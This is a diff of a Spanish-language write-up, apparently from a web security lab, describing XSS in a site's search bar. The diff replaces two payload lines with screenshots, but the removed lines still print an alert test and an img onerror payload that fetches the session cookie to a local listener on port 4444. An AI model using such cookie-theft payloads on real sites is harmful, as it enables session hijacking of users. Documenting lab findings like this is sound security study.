@@ -40,13 +40,13 @@ Tiene un endpoint llamado administración donde podemos ver todos los usuarios r
 
 En la barra de búsqueda podemos insertar script xss:
 
-<img src="x" onerror="alert('XSS Funciona')">
+![image](https://github.com/user-attachments/assets/b87fcd45-fe80-430a-9152-2cd3a162b81b)
 
 ![image](https://github.com/user-attachments/assets/c9ab2e27-d567-481e-99e1-fb42c87066c4)
 
 Al ser vulnerable a XSS, he probado a levantarme un servidor python que escuche el puerto 4444, y en la web ejecuto un script que robe la cookie de sesion del usuario logueado, para que el servidor lo reciba:
 
-<img src="x" onerror="fetch('http://127.0.0.1:4444/steal?cookie=' + document.cookie)">
+![image](https://github.com/user-attachments/assets/5934c899-7294-46da-a780-1666e138b4e1)
 
 ![image](https://github.com/user-attachments/assets/4caa8e13-8fd9-4f3e-af67-48295d66314d)
 
